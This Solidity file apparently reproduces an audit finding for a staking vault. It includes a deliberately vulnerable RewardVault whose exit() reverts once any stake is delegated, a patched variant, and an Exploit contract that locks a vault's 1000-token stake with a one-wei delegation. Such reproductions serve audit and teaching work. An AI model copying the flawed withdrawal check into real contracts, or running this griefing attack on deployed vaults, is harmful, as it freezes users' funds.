// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Aegis Vault — C-01 (Pashov, September 2024)
    RewardVault.exit withdraws the full staked balance. _checkSelfStakedBalance
    subtracts delegateTotalStaked. One delegated wei makes exit revert, so the
    vault cannot unstake the tokens it deposited itself.
*/

contract Token {
    string public symbol = "ICHI";
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

error InsufficientSelfStake();
error DelegateStakedOverflow();

contract RewardVault {
    struct AccountInfo {
        uint256 balance;
    }

    struct DelegateStake {
        uint256 delegateTotalStaked;
        mapping(address => uint256) stakedByDelegate;
    }

    Token public token;
    mapping(address => AccountInfo) internal _accountInfo;
    mapping(address => DelegateStake) internal _delegateStake;

    constructor(Token _token) {
        token = _token;
    }

    function balanceOf(address account) external view returns (uint256) {
        return _accountInfo[account].balance;
    }

    function delegateTotalOf(address account) external view returns (uint256) {
        return _delegateStake[account].delegateTotalStaked;
    }

    function stake(uint256 amount) external {
        require(amount > 0, "amount");
        require(token.transferFrom(msg.sender, address(this), amount), "pull");
        _accountInfo[msg.sender].balance += amount;
    }

    function delegateStake(address account, uint256 amount) external {
        require(amount > 0, "amount");
        require(token.transferFrom(msg.sender, address(this), amount), "pull");
        _accountInfo[account].balance += amount;
        if (account != msg.sender) {
            DelegateStake storage info = _delegateStake[account];
            uint256 delegateStakedBefore = info.delegateTotalStaked;
            uint256 delegateStakedAfter = delegateStakedBefore + amount;
            if (delegateStakedAfter <= delegateStakedBefore) revert DelegateStakedOverflow();
            info.delegateTotalStaked = delegateStakedAfter;
            info.stakedByDelegate[msg.sender] += amount;
        }
    }

    function _checkSelfStakedBalance(address account, uint256 amount) internal view {
        unchecked {
            uint256 balance = _accountInfo[account].balance;
            uint256 delegateTotalStaked = _delegateStake[account].delegateTotalStaked;
            uint256 selfStaked = balance - delegateTotalStaked;
            // @> VULN: exit asks for the full balance, so any delegated stake makes selfStaked < amount and the vault's tokens stay locked
            if (selfStaked < amount) revert InsufficientSelfStake();
        }
    }

    function exit() external virtual {
        uint256 amount = _accountInfo[msg.sender].balance;
        _checkSelfStakedBalance(msg.sender, amount);
        _withdraw(msg.sender, amount);
    }

    function _withdraw(address account, uint256 amount) internal {
        _accountInfo[account].balance -= amount;
        require(token.transfer(account, amount), "withdraw");
    }
}

contract RewardVaultFixed is RewardVault {
    constructor(Token _token) RewardVault(_token) {}

    function exit() external override {
        uint256 balance = _accountInfo[msg.sender].balance;
        uint256 delegated = _delegateStake[msg.sender].delegateTotalStaked;
        uint256 selfStaked = balance - delegated;
        _withdraw(msg.sender, selfStaked);
    }
}

contract AegisVault {
    Token public token;
    RewardVault public rewards;
    bool public exitFailed;

    constructor(Token _token, RewardVault _rewards) {
        token = _token;
        rewards = _rewards;
    }

    function stakeSelf(uint256 amount) external {
        token.approve(address(rewards), amount);
        rewards.stake(amount);
    }

    function tryExit() external returns (bool ok) {
        (ok,) = address(rewards).call(abi.encodeWithSignature("exit()"));
        exitFailed = !ok;
    }
}

contract Exploit {
    uint256 public constant VAULT_STAKE = 1000 ether;
    uint256 public constant DELEGATED = 1;

    Token public token;
    RewardVault public rewards;
    AegisVault public aegis;
    bool public exitFailed;
    uint256 public locked;

    constructor() {
        token = new Token();
        rewards = new RewardVault(token);
        aegis = new AegisVault(token, rewards);
        token.mint(address(aegis), VAULT_STAKE);
        token.mint(address(this), DELEGATED);
    }

    function run() external {
        aegis.stakeSelf(VAULT_STAKE);
        require(rewards.balanceOf(address(aegis)) == VAULT_STAKE, "self staked");
        require(token.balanceOf(address(rewards)) == VAULT_STAKE, "escrow");

        token.approve(address(rewards), DELEGATED);
        rewards.delegateStake(address(aegis), DELEGATED);
        require(rewards.delegateTotalOf(address(aegis)) == DELEGATED, "delegated");
        require(rewards.balanceOf(address(aegis)) == VAULT_STAKE + DELEGATED, "inflated");

        bool ok = aegis.tryExit();
        exitFailed = aegis.exitFailed();
        locked = token.balanceOf(address(rewards));

        require(!ok, "exit succeeded");
        require(exitFailed, "flag");
        require(locked == VAULT_STAKE + DELEGATED, "locked");
        require(rewards.balanceOf(address(aegis)) == VAULT_STAKE + DELEGATED, "still staked");
        require(token.balanceOf(address(aegis)) == 0, "vault recovered nothing");
    }
}
